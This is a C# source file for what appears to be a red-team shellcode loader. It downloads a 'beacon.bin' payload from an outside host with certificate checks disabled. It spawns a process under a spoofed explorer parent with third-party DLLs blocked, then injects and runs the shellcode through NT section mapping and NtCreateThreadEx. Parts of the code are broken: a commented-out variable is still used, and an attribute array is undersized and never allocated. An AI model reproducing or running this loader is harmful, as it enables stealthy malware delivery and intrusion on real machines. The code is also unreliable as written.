using System;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace NtCreateUserProcess
{
    internal static class Program
    {
        public static async Task Main(string[] args)
        {
            // Get shellcode
            byte[] shellcode;
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("https://10.10.0.69/beacon.bin");
                }
            }

            // Parameters for process to start with PPID & BlockDLLs
            var imagePath = new UNICODE_STRING();
            RtlInitUnicodeString(ref imagePath, @"\??\C:\Windows\System32\calc.exe");

            var processParams = IntPtr.Zero;
            var status = RtlCreateProcessParametersEx(
                ref processParams,
                ref imagePath,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                0x01);

            if (status != 0)
            {
                Console.WriteLine("RtlCreateProcessParametersEx failed");
                return;
            }

            var ci = new PS_CREATE_INFO();
            ci.Size = (UIntPtr)88; // sizeof(PS_CREATE_INFO)
            ci.State = PS_CREATE_STATE.PsCreateInitialState;
            ci.unused = new byte[76];

            // var attribute = new PS_ATTRIBUTE();   # 
            var attributeList = new PS_ATTRIBUTE_LIST();
            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf(attributeList);
            // attributeList.Attributes = new PS_ATTRIBUTE[2];

            attributeList.Attributes[0].Attribute = 0x20005;
            attributeList.Attributes[0].Size = imagePath.Length;
            attributeList.Attributes[0].Value = imagePath.Buffer;

            var explorer = Process.GetProcessesByName("explorer").First();

            attributeList.Attributes[1].Attribute = 0x60000;
            attributeList.Attributes[1].Size = (ushort)IntPtr.Size;
            attributeList.Attributes[1].Value = explorer.Handle;

            var pBlockDlls = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(pBlockDlls, new IntPtr(0x100000000000));

            attributeList.Attributes[2].Attribute = 0x20010;
            attributeList.Attributes[2].Size = (ushort)IntPtr.Size;
            attributeList.Attributes[2].Value = pBlockDlls;

            var hProcess = IntPtr.Zero;
            var hThread = IntPtr.Zero;

            status = NtCreateUserProcess(
                ref hProcess,
                ref hThread,
                2097151,
                2097151,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0,
                processParams,
                ref ci,
                ref attributeList);

            if (status != 0)
            {
                int toBase = 16;

                string hex = Convert.ToString(status, toBase);
                Console.WriteLine(hex);
            }

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            // Create a new section in the current process
            NtCreateSection(
                ref hSection,
                0x10000000,     // SECTION_ALL_ACCESS
                IntPtr.Zero,
                ref maxSize,
                0x40,           // PAGE_EXECUTE_READWRITE
                0x08000000,     // SEC_COMMIT
                IntPtr.Zero);

            // Map that section into memory of the current process as RW
            NtMapViewOfSection(
                hSection,
                (IntPtr)(-1),   // will target the current process
                out var localBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,              // ViewUnmap (created view will not be inherited by child processes)
                0,
                0x04);          // PAGE_READWRITE

            // Copy shellcode into memory of our own process
            Marshal.Copy(shellcode, 0, localBaseAddress, shellcode.Length);

            // Dynamically open handle to first occurence of explorer.exe
            // var target = Process.GetProcessesByName("explorer")[0];

            // map region into the target process as RX. 
            NtMapViewOfSection(
                hSection,
                target.Handle,
                out var remoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                0x20);      // PAGE_EXECUTE_READ

            // execute shellcode in the target process
            NtCreateThreadEx(
                out _,
                0x001F0000, // STANDARD_RIGHTS_ALL
                IntPtr.Zero,
                target.Handle,
                remoteBaseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);
        }

        [DllImport("ntdll.dll")]
        private static extern void RtlInitUnicodeString(
            ref UNICODE_STRING destinationString,
            [MarshalAs(UnmanagedType.LPWStr)] string sourceString);

        [DllImport("ntdll.dll")]
        private static extern uint RtlCreateProcessParametersEx(
            ref IntPtr processParameters,
            ref UNICODE_STRING imagePathName,
            IntPtr dllPath,
            IntPtr currentDirectory,
            IntPtr commandLine,
            IntPtr environment,
            IntPtr windowTitle,
            IntPtr desktopInfo,
            IntPtr shellInfo,
            IntPtr runtimeData,
            uint flags);

        [DllImport("ntdll.dll")]
        private static extern uint NtCreateUserProcess(
            ref IntPtr processHandle,
            ref IntPtr threadHandle,
            long processDesiredAccess,
            long threadDesiredAccess,
            IntPtr processObjectAttributes,
            IntPtr threadObjectAttributes,
            uint processFlags,
            uint threadFlags,
            IntPtr processParameters,
            ref PS_CREATE_INFO psCreateInfo,
            ref PS_ATTRIBUTE_LIST psAttributeList);

        [DllImport("ntdll.dll")]
        public static extern uint NtCreateSection(
            ref IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref ulong MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll")]
        public static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            out IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            IntPtr SectionOffset,
            out ulong ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll")]
        public static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_CREATE_INFO
        {
            public UIntPtr Size;
            public PS_CREATE_STATE State;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 76)]
            public byte[] unused;
        }

        private enum PS_CREATE_STATE
        {
            PsCreateInitialState = 0,
            PsCreateFailOnFileOpen = 1,
            PsCreateFailOnSectionCreate = 2,
            PsCreateFailExeFormat = 3,
            PsCreateFailMachineMismatch = 4,
            PsCreateFailExeName = 5,
            PsCreateSuccess = 6,
            PsCreateMaximumStates = 7
        };

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_ATTRIBUTE
        {
            public ulong Attribute;
            public ulong Size;
            public IntPtr Value;
            public IntPtr ReturnLength;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PS_ATTRIBUTE_LIST
        {
            public UIntPtr TotalLength;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public PS_ATTRIBUTE[] Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }
    }
}
